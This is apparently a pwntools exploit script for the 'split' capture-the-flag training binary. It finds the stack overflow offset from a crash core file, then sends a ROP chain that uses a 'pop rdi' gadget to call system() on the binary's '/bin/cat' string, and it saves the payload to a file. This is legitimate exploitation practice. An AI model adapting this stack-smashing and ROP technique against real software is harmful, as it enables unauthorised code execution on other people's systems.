#!/usr/bin/python3

from pwn import *

def start():
	binary_path = "./split"
	p = process(binary_path)
	gdb.attach(p, gdbscript = '''
		b main
		continue
	''')
	return p

context.log_level = "info"
context.delete_corefiles = True
elf = context.binary = ELF("./split")


rdi_gadget = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
# i disable it because it will return system plt.
# the thing i need is the address call system call
#system_addr = elf.symbols.system
#info("system_addr = %#x", system_addr)

# i manualy find it instead
system_addr = 0x40074b
info("system_addr = %#x", system_addr)
bincat_addr = next(elf.search(b'/bin/cat'))
info("bincat_addr = %#x", bincat_addr)
info("rdi_gadget = %#x", rdi_gadget)

io = start()

payload = cyclic(100)
io.sendlineafter(">", payload)
io.wait()
core = io.corefile

rsp = core.rsp
pattern = core.read(rsp, 4)
rip_offset = cyclic_find(pattern)
info(rip_offset)


io = start()
payload = flat(
	asm('nop') * rip_offset,
	rdi_gadget,
	bincat_addr,
	system_addr
)
io.sendlineafter(">", payload)
f = open("./payload64_2", "wb")
f.write(payload)
f.close()

while 1:
	tmp = io.recv()
	info(tmp)


